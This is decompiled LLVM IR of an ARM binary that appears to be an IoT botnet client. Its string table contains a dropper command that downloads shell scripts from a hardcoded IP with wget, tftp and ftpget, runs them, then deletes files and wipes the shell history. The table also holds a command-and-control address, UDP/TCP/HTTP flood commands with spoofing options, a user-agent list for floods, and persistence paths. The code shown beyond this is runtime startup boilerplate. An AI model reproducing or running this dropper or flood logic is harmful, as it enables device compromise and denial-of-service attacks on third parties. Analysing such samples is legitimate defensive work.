@global_var_2701c.374 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c7a8.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c7b0.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c7b8.56, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c7c4.57, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c7cc.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c7d4.59, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c7dc.60, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c7e0.49, i32 0, i32 0), i8* bitcast (i32* @global_var_1c7e8.50 to i8*), i8* bitcast (i32* @global_var_1c7ec.51 to i8*)]
@global_var_1cc28.377 = constant i32 993090331
@global_var_1cc88.379 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1cc90.381 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1ba58.383 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_26a48.384 = local_unnamed_addr global [443 x i8]* @global_var_1ba58.383
@global_var_1cc98.386 = constant [6 x i8] c"arfgG\00"
@global_var_1cca0.387 = constant [9 x i8] c"HBiug655\00"
@global_var_1ccac.388 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1ccbc.389 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1ccd0.390 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1cce4.391 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1ccf0.392 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1ccfc.393 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1cd08.394 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1cd14.395 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1cd20.396 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1cd30.397 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1cd3c.398 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1cd4c.399 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1cd58.400 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1cd68.401 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1cd74.402 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1cd80.403 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1cd8c.404 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1cd9c.405 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1cdac.406 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1cdbc.407 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1cdc8.408 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1cdd8.409 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1cde8.410 = constant [12 x i8] c"yteytietyue\00"
@global_var_1cdf4.411 = constant [9 x i8] c"qsortEQS\00"
@global_var_1ce00.412 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1ce10.413 = constant [4 x i8] c"std\00"
@global_var_1ce14.414 = constant [4 x i8] c"dts\00"
@global_var_1ce18.415 = constant [4 x i8] c"lsk\00"
@global_var_1ce1c.416 = constant [4 x i8] c"kek\00"
@global_var_1ce20.417 = constant [6 x i8] c"smack\00"
@global_var_1ce28.418 = constant [4 x i8] c"ily\00"
@global_var_1ce2c.419 = constant [4 x i8] c"tyf\00"
@global_var_1ce30.420 = constant [4 x i8] c"pos\00"
@global_var_1ce34.421 = constant [6 x i8] c"cunts\00"
@global_var_1ce3c.422 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cc98.386, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1cca0.387, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ccac.388, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1ccbc.389, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1ccd0.390, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cce4.391, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ccf0.392, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ccfc.393, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1cd08.394, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1cd14.395, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd20.396, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cd30.397, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1cd3c.398, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1cd4c.399, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1cd58.400, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1cd68.401, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cd74.402, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cd80.403, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd8c.404, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd9c.405, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cdac.406, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1cdbc.407, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cdc8.408, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cdd8.409, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cde8.410, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1cdf4.411, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ce00.412, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ce10.413, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ce14.414, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ce18.415, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ce1c.416, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ce20.417, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ce28.418, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ce2c.419, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ce30.420, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ce34.421, i32 0, i32 0)]
@global_var_1ad68.426 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1ada8.427 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1adec.428 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1ae30.429 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1ae74.430 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1aeb8.431 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1aefc.432 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1af40.433 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1afb0.434 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_1b024.435 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_1b070.436 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_1b0f8.437 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_1b144.438 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_1b1b4.439 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_1b224.440 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_1b298.441 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_1b310.442 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1b358.443 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_1b388.444 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_1b3c8.445 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1b414.446 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_1b48c.447 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1b4fc.448 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_1b56c.449 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_1b5e0.450 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_1b674.451 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_1b6bc.452 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_1b704.453 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_1b744.454 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_1b7c0.455 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_1b828.456 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_1b8a4.457 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_1b8f4.458 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_1b948.459 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_1b99c.460 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_1b9f0.461 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_1ba44.462 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_269b4.463 = global [37 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1ad68.426, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_1ada8.427, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1adec.428, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ae30.429, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ae74.430, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1aeb8.431, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1aefc.432, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1af40.433, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1afb0.434, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1b024.435, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_1b070.436, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1b0f8.437, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1b144.438, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b1b4.439, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b224.440, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_1b298.441, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1b310.442, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1b358.443, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_1b388.444, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1b3c8.445, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_1b414.446, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_1b48c.447, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b4fc.448, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b56c.449, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_1b5e0.450, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1b674.451, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1b6bc.452, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1b704.453, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_1b744.454, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_1b7c0.455, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_1b828.456, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1b8a4.457, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b8f4.458, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b948.459, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1b99c.460, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_1b9f0.461, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1ba44.462, i32 0, i32 0)]
@global_var_c8e0.464 = constant i32 118476
@global_var_1cecc.465 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_1cf0c.468 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1cf28.470 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1cf4c.475 = constant [4 x i8] c"all\00"
@global_var_1cf50.477 = constant i32 44
@global_var_1cf54.479 = constant [4 x i8] c"syn\00"
@global_var_1cf58.481 = constant [4 x i8] c"rst\00"
@global_var_1cf5c.483 = constant [4 x i8] c"fin\00"
@global_var_1cf60.485 = constant [4 x i8] c"ack\00"
@global_var_1cf64.487 = constant [4 x i8] c"psh\00"
@global_var_1cf68.489 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1cf7c.493 = constant [6 x i8] c"PONG!\00"
@global_var_1cf84.495 = constant [6 x i8] c"PUSSY\00"
@global_var_1cf8c.497 = constant [4 x i8] c"OFF\00"
@global_var_2d53c.499 = global i32 0
@global_var_1cf90.501 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_1cfa0.503 = constant [3 x i8] c"ON\00"
@global_var_1cfa4.505 = constant [5 x i8] c"HTTP\00"
@global_var_1cfac.507 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_1cfd4.509 = constant [4 x i8] c"UDP\00"
@global_var_ffdc.510 = constant i32 -369098744
@global_var_1cfd8.512 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1d04c.515 = constant [4 x i8] c"TCP\00"
@global_var_1d050.517 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1d10c.519 = constant [4 x i8] c"STD\00"
@global_var_1d110.521 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1d12c.523 = constant [5 x i8] c"STOP\00"
@global_var_26fa8.528 = local_unnamed_addr global i32 -1
@global_var_26a44.530 = global [20 x i8]* @global_var_1ba44.462
@global_var_1d134.532 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1d13c.535 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1d14c.537 = constant [11 x i8] c"\0900000000\09\00"
@global_var_272e0.539 = global i32 0
@global_var_1d158.541 = constant [6 x i8] c"ARM-4\00"
@global_var_1d160.543 = constant i32 0
@global_var_1d164.545 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_1d17c.549 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1d18c.551 = constant i32 47
@global_var_1d190.553 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1d198.555 = constant i32 97
@global_var_1d19c.557 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1d1ac.561 = constant i32 993090331
@global_var_1d214.566 = constant [5 x i8] c"PONG\00"
@global_var_1d21c.568 = constant [9 x i8] c"LELIMDUP\00"
@global_var_1d228.570 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_1d23c.572 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_1d248.574 = constant [8 x i8] c"%s 2>&1\00"
@global_var_1d250.576 = constant [3 x i8] c"%s\00"
@global_var_1d254.578 = constant i32 32
@global_var_26934.581 = global i32 0
@global_var_11724.594 = constant i32 -382906384
@global_var_1375c.598 = constant i32 -382909968
@global_var_10170.613 = constant i32 -509607926
@global_var_10340.623 = constant i32 -382910448
@global_var_15d4c.624 = constant i32 -382909968
@global_var_15e00.625 = constant i32 -382910224
@global_var_154e8.657 = constant i32 -509607923
@global_var_11494.661 = constant i32 -509607928
@global_var_11b3c.688 = constant i32 -456978431
@global_var_12880.726 = constant i32 -478871519
@global_var_131cc.734 = constant i32 -478805983
@global_var_135a8.743 = constant i32 -382906384
@global_var_fb00.752 = constant i32 -509591552
@global_var_13b68.759 = constant i32 -442564540
@global_var_14410.802 = constant i32 -494075872
@global_var_fb2c.803 = constant i32 -382910336
@global_var_145d0.815 = constant i32 -369098421
@global_var_139d8.834 = constant i32 -442543860
@global_var_11bf0.843 = constant i32 -369093626
@global_var_15098.856 = constant i32 -335545191
@global_var_154fc.868 = constant i32 -443088884
@global_var_17cf4.917 = constant i32 -382909456
@global_var_fb64.940 = constant i32 -382910336
@global_var_19158.945 = constant i32 -442695584
@global_var_19720.954 = constant i32 -382910224
@global_var_1a574.980 = constant i32 -504313148
@global_var_1a55c.981 = constant i32 -483131392
@global_var_1a408.982 = constant i32 -481229311
@global_var_1a5e4.983 = constant i32 -477817729
@global_var_1a6e4.984 = constant i32 -476034303
@global_var_1a920.985 = constant i32 -516685812
@global_var_1a814.986 = constant i32 -905969571
@global_var_1a748.987 = constant i32 -528203771
@global_var_1a9a8.988 = constant i32 -478079873
@global_var_1a98c.989 = constant i32 -534704125
@global_var_1a93c.990 = constant i32 -534704125
@global_var_1a8d4.991 = constant i32 -483131392
@global_var_272b0.4 = external global i8*
@global_var_272eb.71 = external global i8*
@global_var_272ec.73 = local_unnamed_addr global i8 0
@global_var_272ed.74 = local_unnamed_addr global i8 0
@global_var_272ee.75 = local_unnamed_addr global i8 0
@global_var_1d178.547 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_272b0.4 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_272b0.4 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_272b0.4, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_26930.14, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_26930.14 to i32)

; uselistorder directives
  uselistorder i32* @global_var_26930.14, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e770.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 109912, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_272f0.21, align 4
